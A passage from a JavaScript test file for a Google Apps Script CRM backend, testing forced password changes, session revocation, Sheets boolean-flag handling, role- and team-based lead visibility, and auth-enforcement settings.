  const login = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'ExposedPass12' },
  }))._raw);

  assert.equal(login.status, 'success', 'a flagged account must still be able to sign in');
  assert.equal(login.data.mustChangePassword, true,
    'the client is not told a change is required');

  // And the session works: the flag must not silently disable the account,
  // because there would be no way for the user to fix it.
  const token = login.data.token;
  const leads = JSON.parse(be.postRaw(JSON.stringify({
    action: 'getLeads', payload: {}, token,
  }))._raw);
  assert.equal(leads.status, 'success', 'a flagged account was blocked from working');
});

test('APPSCRIPT-6: changing the password clears the flag and the old one stops working', () => {
  const be = buildScenario();
  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');
  be.call('setUserPassword', user.ID, 'ExposedPass12', { mustChange: true });

  const token = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'ExposedPass12' },
  }))._raw).data.token;

  const changed = JSON.parse(be.postRaw(JSON.stringify({
    action: 'changePassword', token,
    payload: { currentPassword: 'ExposedPass12', newPassword: 'BrandNewPass34' },
  }))._raw);
  assert.equal(changed.status, 'success', changed.message);

  const row = be.call('getRecordByIdRaw', 'Users', user.ID);
  assert.equal(String(row.MustChangePassword || ''), '', 'the flag was not cleared');

  const withNew = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'BrandNewPass34' },
  }))._raw);
  assert.equal(withNew.status, 'success', 'the new password does not work');
  assert.equal(withNew.data.mustChangePassword, false);

  const withOld = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'ExposedPass12' },
  }))._raw);
  assert.equal(withOld.status, 'error', 'the exposed password still works');
});

test('APPSCRIPT-7: a change cannot be made without the current password', () => {
  const be = buildScenario();
  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');
  be.call('setUserPassword', user.ID, 'ExposedPass12', { mustChange: true });

  const token = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'ExposedPass12' },
  }))._raw).data.token;

  const forged = JSON.parse(be.postRaw(JSON.stringify({
    action: 'changePassword', token,
    payload: { currentPassword: 'NotTheRightOne', newPassword: 'BrandNewPass34' },
  }))._raw);

  assert.equal(forged.status, 'error',
    'someone at an unlocked laptop could change the password without knowing it');

  const stillOld = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'ExposedPass12' },
  }))._raw);
  assert.equal(stillOld.status, 'success', 'the password was changed anyway');
});

test('APPSCRIPT-8: a Sheets boolean flag still reaches the client as must-change', () => {
  const be = buildScenario();
  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');

  be.call('setUserPassword', user.ID, 'ExposedPass12', { mustChange: true });

  // Sheets coerced the written string into a real boolean. This is the state
  // production is actually in.
  const raw = be.call('getRecordByIdRaw', 'Users', user.ID).MustChangePassword;
  assert.equal(typeof raw, 'boolean',
    'the harness is not modelling Sheets boolean coercion any more');
  assert.notEqual(String(raw), 'TRUE',
    "String(true) is 'true' — any === 'TRUE' comparison is broken by this");

  // What matters: the client is still told.
  const login = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'ExposedPass12' },
  }))._raw);
  assert.equal(login.data.mustChangePassword, true,
    'the login response lost the flag, so the change prompt never appears');

  const listed = JSON.parse(be.postRaw(JSON.stringify({
    action: 'getUsers', payload: {}, token: login.data.token,
  }))._raw).data.find((u) => u.ID === user.ID);
  assert.equal(listed.MustChangePassword, true,
    'getUsers lost the flag');
});

test('APPSCRIPT-9: soft-deleted leads stay hidden despite boolean coercion', () => {
  const be = buildScenario();
  const token = loginAs(be, ID.superAdmin);

  const before = authGet(be, token, 'getLeads', {}).data.length;
  authPost(be, token, 'deleteLead', { leadId: ID.leadAlphaNew, reason: 'duplicate' });

  const raw = be.call('getRecordByIdRaw', 'Leads', ID.leadAlphaNew).Deleted;
  assert.equal(typeof raw, 'boolean', 'the Deleted flag is not a Sheets boolean');

  const after = authGet(be, token, 'getLeads', {}).data;
  assert.equal(after.length, before - 1, 'a deleted lead is still being listed');
  assert.ok(!after.some((l) => l.ID === ID.leadAlphaNew),
    'the soft-delete flag stopped working under boolean coercion');
});

test('APPSCRIPT-10: no backend file compares a sheet flag with === TRUE', async () => {
  // The read must go through isTrueFlag. A direct comparison passes locally
  // only when the harness is wrong, which is how this shipped once already.
  const fs = await import('node:fs');
  const path = await import('node:path');
  const dir = path.join(process.cwd(), 'backend_apps_script');

  const offenders = [];
  for (const file of fs.readdirSync(dir).filter((f) => f.endsWith('.gs'))) {
    const text = fs.readFileSync(path.join(dir, file), 'utf8');
    text.split('\n').forEach((line, i) => {
      if (!/===\s*'TRUE'/.test(line)) return;
      // isTrueFlag itself is the one permitted place.
      if (/toUpperCase\(\)\s*===\s*'TRUE'/.test(line)) return;
      if (line.trim().startsWith('*') || line.trim().startsWith('//')) return;
      offenders.push(`${file}:${i + 1}  ${line.trim()}`);
    });
  }

  assert.deepEqual(offenders, [],
    'These compare a sheet cell to the string TRUE. Sheets stores it as a ' +
    'boolean, so they are always false in production:\n  ' + offenders.join('\n  '));
});

test('APPSCRIPT-11: change password at PRODUCTION iteration count, end to end', () => {
  const be = buildScenario();
  be.setProp('PASSWORD_ITERATIONS', '750');

  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');
  be.call('setUserPassword', user.ID, 'OriginalPass12', { mustChange: true });

  const login1 = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'OriginalPass12' },
  }))._raw);
  assert.equal(login1.status, 'success', `first login failed: ${login1.message}`);

  const changed = JSON.parse(be.postRaw(JSON.stringify({
    action: 'changePassword', token: login1.data.token,
    payload: { currentPassword: 'OriginalPass12', newPassword: 'ReplacementPass34' },
  }))._raw);
  assert.equal(changed.status, 'success', `change failed: ${changed.message}`);

  // The stored hash must actually differ now.
  const row = be.call('getRecordByIdRaw', 'Users', user.ID);
  assert.ok(be.call('verifyPassword', row, 'ReplacementPass34'),
    'the NEW password does not verify against the stored hash — the change did not persist');
  assert.ok(!be.call('verifyPassword', row, 'OriginalPass12'),
    'the OLD password still verifies — the hash was not replaced');

  // And a fresh login with the new password works.
  const login2 = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'ReplacementPass34' },
  }))._raw);
  assert.equal(login2.status, 'success', `login with the new password failed: ${login2.message}`);
});

test('APPSCRIPT-12: changing the password ends the session that changed it', () => {
  const be = buildScenario();
  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');
  be.call('setUserPassword', user.ID, 'OriginalPass12', { mustChange: false });

  const token = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'OriginalPass12' },
  }))._raw).data.token;

  be.postRaw(JSON.stringify({
    action: 'changePassword', token,
    payload: { currentPassword: 'OriginalPass12', newPassword: 'ReplacementPass34' },
  }));

  // The session that made the change SURVIVES: that person just proved they
  // knew the current password. Signing them out made a successful change look
  // like a failure.
  const after = JSON.parse(be.postRaw(JSON.stringify({
    action: 'getSession', payload: {}, token,
  }))._raw);
  assert.equal(after.status, 'success',
    'changing your own password signed you out of your own session');
});

test('APPSCRIPT-13: a password change signs out OTHER sessions but not this one', () => {
  const be = buildScenario();
  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');
  be.call('setUserPassword', user.ID, 'OriginalPass12', { mustChange: false });

  const login = (ua) => JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'OriginalPass12', ua },
  }))._raw).data.token;

  const laptop = login('laptop');
  const phone = login('phone');
  const stranger = login('stranger-who-knows-the-old-password');

  const alive = (token) => JSON.parse(be.postRaw(JSON.stringify({
    action: 'getSession', payload: {}, token,
  }))._raw).status === 'success';

  assert.ok(alive(laptop) && alive(phone) && alive(stranger), 'setup');

  const res = JSON.parse(be.postRaw(JSON.stringify({
    action: 'changePassword', token: laptop,
    payload: { currentPassword: 'OriginalPass12', newPassword: 'ReplacementPass34' },
  }))._raw);
  assert.equal(res.status, 'success', res.message);

  assert.ok(alive(laptop), 'the session that made the change was ended');
  assert.ok(!alive(phone), 'another session survived the password change');
  assert.ok(!alive(stranger),
    'someone holding the OLD password kept their session — that is the whole ' +
    'reason for changing it');
  assert.equal(res.data.sessionsRevoked, 2, 'exactly the other two should go');
});

test('SCOPE-SA-1: an ADMIN can see a lead created by a SUPER_ADMIN', () => {
  const be = buildScenario();

  // The owner sources a lead themselves and does not hand it over.
  const created = authPost(be, loginAs(be, ID.superAdmin), 'createLead', {
    Name: 'Owner Sourced Co', Email: 'owner@sourced.test', Status: 'New',
  });
  assert.equal(created.status, 'success', created.message);

  const seen = authGet(be, loginAs(be, ID.adminAlpha), 'getLeads', {}).data;
  assert.ok(seen.some((l) => l.ID === created.data.ID),
    'a team lead cannot see a lead the owner created, so cannot run or assign it');
});

test('SCOPE-SA-2: a rep still sees only their own work', () => {
  const be = buildScenario();

  const created = authPost(be, loginAs(be, ID.superAdmin), 'createLead', {
    Name: 'Owner Sourced Co', Email: 'owner@sourced.test', Status: 'New',
  });

  const repSees = authGet(be, loginAs(be, ID.repAlpha1), 'getLeads', {}).data;
  assert.ok(!repSees.some((l) => l.ID === created.data.ID),
    'the widened rule leaked a lead to a rep it is not assigned to');
});

test('SCOPE-SA-3: one team still cannot see another team', () => {
  const be = buildScenario();

  const betaLead = authPost(be, loginAs(be, ID.repBeta1), 'createLead', {
    Name: 'Beta Private Co', Email: 'beta@private.test', Status: 'New',
  });
  assert.equal(betaLead.status, 'success', betaLead.message);

  const alphaAdminSees = authGet(be, loginAs(be, ID.adminAlpha), 'getLeads', {}).data;
  assert.ok(!alphaAdminSees.some((l) => l.ID === betaLead.data.ID),
    'team isolation broke: an Alpha manager can see Beta team work');
});

test('SCOPE-SA-4: a SUPER_ADMIN still sees everything', () => {
  const be = buildScenario();

  const betaLead = authPost(be, loginAs(be, ID.repBeta1), 'createLead', {
    Name: 'Beta Co', Email: 'beta@co.test', Status: 'New',
  });
  const alphaLead = authPost(be, loginAs(be, ID.repAlpha1), 'createLead', {
    Name: 'Alpha Co', Email: 'alpha@co.test', Status: 'New',
  });

  const all = authGet(be, loginAs(be, ID.superAdmin), 'getLeads', {}).data;
  assert.ok(all.some((l) => l.ID === betaLead.data.ID));
  assert.ok(all.some((l) => l.ID === alphaLead.data.ID));
});

test('APPSCRIPT-14: enforcement typed by hand is read tolerantly', () => {
  const be = buildScenario();

  for (const value of ['on', 'ON', 'On', ' on ', '  ON']) {
    be.setProp('AUTH_ENFORCEMENT', value);
    assert.equal(be.call('getAuthEnforcement'), 'on',
      `"${value}" typed into Script Properties did not enable enforcement. ` +
      'A stray capital silently leaving the API open is the worst possible ' +
      'failure mode for this setting.');
  }

  for (const value of ['warn', 'WARN', ' Warn ']) {
    be.setProp('AUTH_ENFORCEMENT', value);
    assert.equal(be.call('getAuthEnforcement'), 'warn');
  }

  for (const value of ['off', 'OFF', ' Off ']) {
    be.setProp('AUTH_ENFORCEMENT', value);
    assert.equal(be.call('getAuthEnforcement'), 'off');
  }
});

test('APPSCRIPT-15: an unrecognised enforcement value fails safe and says so', () => {
  const be = buildScenario();
  be.env.logs.length = 0;
  be.setProp('AUTH_ENFORCEMENT', 'enabled');

  assert.equal(be.call('getAuthEnforcement'), 'off',
    'an unknown value must not be guessed at');
  assert.ok(be.env.logs.join('\n').includes('not one of'),
    'an unrecognised value was ignored without a word — the operator meant ' +
    'something and should be told it did not take');
});

test('APPSCRIPT-16: enforcement set by hand actually rejects an anonymous call', () => {
  const be = buildScenario();
  be.setProp('AUTH_ENFORCEMENT', 'ON');   // as typed into Script Properties

  const anon = JSON.parse(be.postRaw(JSON.stringify({
    action: 'getLeads', payload: {},
  }))._raw);
  assert.equal(anon.status, 'error', 'an unauthenticated read was served');
  assert.equal(anon.code, 'UNAUTHENTICATED');

  // Signing in must still work — login is the one public action.
  const user = be.rows('Users').find((u) => u.Role === 'SUPER_ADMIN');
  be.call('setUserPassword', user.ID, 'RealWorldPass99', { mustChange: false });
  const login = JSON.parse(be.postRaw(JSON.stringify({
    action: 'login', payload: { username: user.Username, password: 'RealWorldPass99' },
  }))._raw);
  assert.equal(login.status, 'success',
    'enforcement blocked login itself — nobody could ever get back in');

  const authed = JSON.parse(be.postRaw(JSON.stringify({
    action: 'getLeads', payload: {}, token: login.data.token,
  }))._raw);
  assert.equal(authed.status, 'success', 'a signed-in user was blocked');
});
